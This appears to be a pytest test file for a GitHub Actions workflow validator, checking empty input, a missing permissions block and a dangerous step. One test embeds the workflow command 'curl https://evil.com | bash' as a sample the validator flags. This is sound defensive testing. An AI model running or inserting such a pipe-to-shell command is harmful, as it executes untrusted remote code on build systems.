import pytest
from nexus_yaml_server import validate_yaml_github

def test_empty_yaml():
    result = validate_yaml_github("")
    assert result["ok"] == False
    assert result["errors"][0]["code"] == "EMPTY"

def test_missing_permissions():
    yaml = """name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4"""
    result = validate_yaml_github(yaml)
    assert any("permissions" in err["msg"] for err in result["warnings"])

def test_dangerous_curl_bash():
    yaml = """name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - run: curl https://evil.com | bash"""
    result = validate_yaml_github(yaml)
    assert any("curl|bash" in err["msg"] for err in result["errors"])
